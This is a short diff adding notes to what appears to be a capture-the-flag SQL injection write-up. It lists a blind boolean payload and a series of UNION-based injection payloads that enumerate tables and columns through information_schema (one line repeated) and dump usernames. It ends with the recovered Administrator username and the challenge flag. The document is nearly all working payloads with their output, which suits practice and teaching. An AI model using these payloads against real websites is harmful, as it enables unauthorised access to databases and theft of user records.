@@ -1,1 +1,11 @@
 OR 1=1 AND 1=IF((SELECT LENGTH(DATABASE()))>1,1,2);-- -\
+
+We can use UNION base injiction:
+
+union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database();-- -\
+union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273;-- -\
+union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273;-- -\
+union select 1,2,username from users;-- -\
+
+username Administrator
+flag FLAG-d4mn_Y0ur3_G3tt1ng_G00d_4t_Th15
